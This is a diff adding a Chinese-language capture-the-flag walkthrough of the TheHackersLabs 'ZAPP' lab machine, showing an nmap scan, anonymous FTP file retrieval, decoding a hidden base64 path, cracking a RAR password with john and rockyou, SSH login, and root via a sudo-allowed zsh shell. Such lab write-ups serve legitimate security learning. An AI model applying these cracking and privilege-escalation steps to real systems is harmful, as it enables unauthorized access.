@@ -80,6 +80,277 @@ root@TheHackersLabs-Tortuga:~# cat /root/root.txt
 c???????????????????????????ae
 ```
 
+# ZAPP
+
+## 信息搜集
+
+```bash
+(base) yolo@yolo:~$ nmap -sV -Pn 10.161.167.222
+Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-11-02 22:11 CST
+Nmap scan report for 10.161.167.222
+Host is up (0.81s latency).
+Not shown: 997 closed tcp ports (conn-refused)
+PORT   STATE SERVICE VERSION
+21/tcp open  ftp     vsftpd 2.0.8 or later
+22/tcp open  ssh     OpenSSH 8.4p1 Debian 5+deb11u5 (protocol 2.0)
+80/tcp open  http    Apache httpd 2.4.65 ((Debian))
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 12.35 seconds
+```
+
+先分析下ftp协议
+
+```bash
+(base) yolo@yolo:~$ ftp 10.161.167.222
+Connected to 10.161.167.222.
+220 Welcome zappskred.
+Name (10.161.167.222:yolo): anonymous
+331 Please specify the password.
+Password:
+230 Login successful.
+Remote system type is UNIX.
+Using binary mode to transfer files.
+ftp> help
+Commands may be abbreviated.  Commands are:
+
+!               delete          hash            mlsd            pdir            remopts         struct
+$               dir             help            mlst            pls             rename          sunique
+account         disconnect      idle            mode            pmlsd           reset           system
+append          edit            image           modtime         preserve        restart         tenex
+ascii           epsv            lcd             more            progress        rhelp           throttle
+bell            epsv4           less            mput            prompt          rmdir           trace
+binary          epsv6           lpage           mreget          proxy           rstatus         type
+bye             exit            lpwd            msend           put             runique         umask
+case            features        ls              newer           pwd             send            unset
+cd              fget            macdef          nlist           quit            sendport        usage
+cdup            form            mdelete         nmap            quote           set             user
+chmod           ftp             mdir            ntrans          rate            site            verbose
+close           gate            mget            open            rcvbuf          size            xferbuf
+cr              get             mkdir           page            recv            sndbuf          ?
+debug           glob            mls             passive         reget           status
+ftp> ls
+229 Entering Extended Passive Mode (|||58817|)
+150 Here comes the directory listing.
+-rw-r--r--    1 0        0              28 Oct 29 20:59 login.txt
+-rw-r--r--    1 0        0              65 Oct 29 21:23 secret.txt
+226 Directory send OK.
+ftp> get login.txt
+local: login.txt remote: login.txt
+229 Entering Extended Passive Mode (|||6845|)
+150 Opening BINARY mode data connection for login.txt (28 bytes).
+100% |*******************************************************************|    28        5.08 KiB/s    00:00 ETA
+226 Transfer complete.
+28 bytes received in 00:00 (3.04 KiB/s)
+ftp> get secret.txt
+local: secret.txt remote: secret.txt
+229 Entering Extended Passive Mode (|||51043|)
+150 Opening BINARY mode data connection for secret.txt (65 bytes).
+100% |*******************************************************************|    65        9.05 KiB/s    00:00 ETA
+226 Transfer complete.
+65 bytes received in 00:00 (6.08 KiB/s)
+ftp> bye
+221 Goodbye.
+(base) yolo@yolo:~$ ls
+8c5852e6-56fe-4474-9fc7-70123454c347.gif  key      login.txt   nfspy_mount  pattern.txt  secret.txt  test1
+Desktop                                   key.pub  miniforge3  ntfs.db      reports      snap        test2
+(base) yolo@yolo:~$ cat login.txt
+puerto
+4444
+coffee
+GoodLuck
+(base) yolo@yolo:~$ cat secret.txt
+0jO cOn 31 c4fe 813n p23p424dO, 4 v3c35 14 pista 357a 3n 14 7424
+```
+
+匿名用户拿到两个文件，发现secret.txt是leet语言，解密说是小心烫的咖啡，没搞懂，接下来看看http呢？
+
+审计源码，拿到了
+
+```html
+<div style="display:none">4444 VjFST1YyRkhVa2xUYmxwYVRURmFiMXBGYUV0a2JWSjBWbTF3WVZkRk1VeERaejA5Q2c9PQo=</div>
+```
+
+进行4次base64解码，拿到了串字符，不晓得是什么，多次尝试，发现是一个路由
+
+<img src="/assets/img/thehackerslabs-notes/image-20251102223447740.png" alt="image-20251102223447740" style="zoom:50%;" />
+
+拿到了一个压缩包
+
+<img src="/assets/img/thehackerslabs-notes/image-20251102223522660.png" alt="image-20251102223522660" style="zoom:50%;" />
+
+怎么能是压缩的呢，不晓得密码是啥
+
+## get flag
+
+> 下面是参考老大的视频学习的：【thehackerlabs ZAPP靶机复盘-哔哩哔哩】 https://b23.tv/MdQIjKw
+
+这里需要用rockyou进行爆破
+
+```bash
+~$ wget http://10.161.167.222/cuatrocuatroveces/Sup3rP4ss.rar
+~$ rar2john Sup3rP4ss.rar > tmp
+~$ john tmp --wordlist=/snap/seclists/rockyou.txt
+Using default input encoding: UTF-8
+Loaded 1 password hash (RAR5 [PBKDF2-SHA256 256/256 AVX2 8x])
+Cost 1 (iteration count) is 32768 for all loaded hashes
+Will run 32 OpenMP threads
+Note: Passwords longer than 10 [worst case UTF-8] to 32 [ASCII] rejected
+Press 'q' or Ctrl-C to abort, 'h' for help, almost any other key for status
+reema            (Sup3rP4ss.rar)
+1g 0:00:00:19 DONE (2025-11-02 23:22) 0.05056g/s 4296p/s 4296c/s 4296C/s tracymcgrady..llandudno
+Use the "--show" option to display all of the cracked passwords reliably
+Session completed
+```
+
+拿到了压缩包密码
+
+```bash
+(base) yolo@yolo:~/Desktop/timu$ unrar x Sup3rP4ss.rar
+
+UNRAR 7.00 freeware      Copyright (c) 1993-2024 Alexander Roshal
+
+
+Extracting from Sup3rP4ss.rar
+
+Enter password (will not be echoed) for Sup3rP4ss.txt:
+
+Extracting  Sup3rP4ss.txt                                             OK
+All OK
+(base) yolo@yolo:~/Desktop/timu$ cat Sup3rP4ss.txt
+Intenta probar con más >> 3spuM4 
+```
+
+哈哈，这里真难绷，都能硬控老大10多分钟，3spuM4是一个用户的密码，但是我们不晓得用户名，老大已经帮我测试了好多好多，最后发现是这里的`zappskred`
+
+![image-20251102232650887](/assets/img/thehackerslabs-notes/image-20251102232650887.png)
+
+这里的用户名我们前面见过一次的，是主机名
+
+<img src="/assets/img/thehackerslabs-notes/image-20251102232807152.png" alt="image-20251102232807152" style="zoom:50%;" />
+
+直接ssh远程登上去，拿到user.txt，接下来查看.bash_history，其实已经能知道rootflag是啥了，也能看得出来，这里出题人打算用sudoers出，直接拿root
+
+```bash
+zappskred@TheHackersLabs-ZAPP:~$ ls
+user.txt
+zappskred@TheHackersLabs-ZAPP:~$ cat user.txt
+ZWwgbWVqb3?????????=
+zappskred@TheHackersLabs-ZAPP:~$ cat .bash_history
+ftp
+sudo apt install ftp
+sudo apt install vsftpd -y
+sudo su
+su
+clear
+sudo apt install vsftpd -y
+ftpdç
+ftpd
+cd /etc/
+ls
+ip a
+cls
+clear
+ip a
+sudo dhclient
+clear
+ip a
+sudo reboot now
+cat /etc/sudoers
+sudo cat /etc/sudoers
+sudo su
+sudo root
+exit
+clear
+ifconfig
+ip a
+ssh-keygen -f '/home/kali/.ssh' -R '192.168.1.34'
+ssh-keygen -f '/home/kali/ .ssh' -R '192.168.1.34'
+sudo ssh-keygen -f '/home/kali/ .ssh' -R '192.168.1.34'
+exit
+clear
+ls
+clear
+exit
+clear
+passwd
+exit
+clear
+ls
+cat
+clear
+sudo apt install zsh
+exit
+clear
+whoami
+sudo -l
+clear
+sudo zsh
+sudo su
+sudo root
+exit
+ls
+sudo -l
+sudo zsh
+clear
+echo "exitosocafe" | base64
+exit
+ls
+ls -lash
+cp user.txt user.txt
+mv user.txt user.txt
+rm user.txt
+ls
+clear
+echo "el mejor cafe" | base64 > user.txt
+ls
+cd ..
+system
+apt install apache2
+exit
+clear
+sudo zsh
+clear
+nano ~/.bashrc
+cat /etc/issue
+exit
+sudo zsh
+clear
+sudo zsh
+clear
+sudo zsh
+exit
+echo '    ███████╗ █████╗ ██████╗ ██████╗
+ ╚══███╔╝██╔══██╗██╔══██╗██╔══██╗
+   ███╔╝ ███████║██████╔╝██████╔╝
+  ███╔╝  ██╔══██║██╔═══╝ ██╔═══╝
+ ███████╗██║  ██║██║     ██║
+ ╚══════╝╚═╝  ╚═╝╚═╝     ╚═╝
+
+' | sudo tee /etc/issue.net > /dev/null
+clear
+sudo zsh
+exit
+sudo zsh
+exit
+zappskred@TheHackersLabs-ZAPP:~$ sudo -l
+sudo: unable to resolve host TheHackersLabs-ZAPP: Name or service not known
+[sudo] password for zappskred:
+Sorry, try again.
+[sudo] password for zappskred:
+Matching Defaults entries for zappskred on TheHackersLabs-ZAPP:
+    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin
+
+User zappskred may run the following commands on TheHackersLabs-ZAPP:
+    (root) /bin/zsh
+zappskred@TheHackersLabs-ZAPP:~$ sudo /bin/zsh
+sudo: unable to resolve host TheHackersLabs-ZAPP: Name or service not known
+TheHackersLabs-ZAPP# cat ~/root.txt
+c2llbXByZSBlcyBudWV???????==
+TheHackersLabs-ZAPP#
+```
+
 
 
 
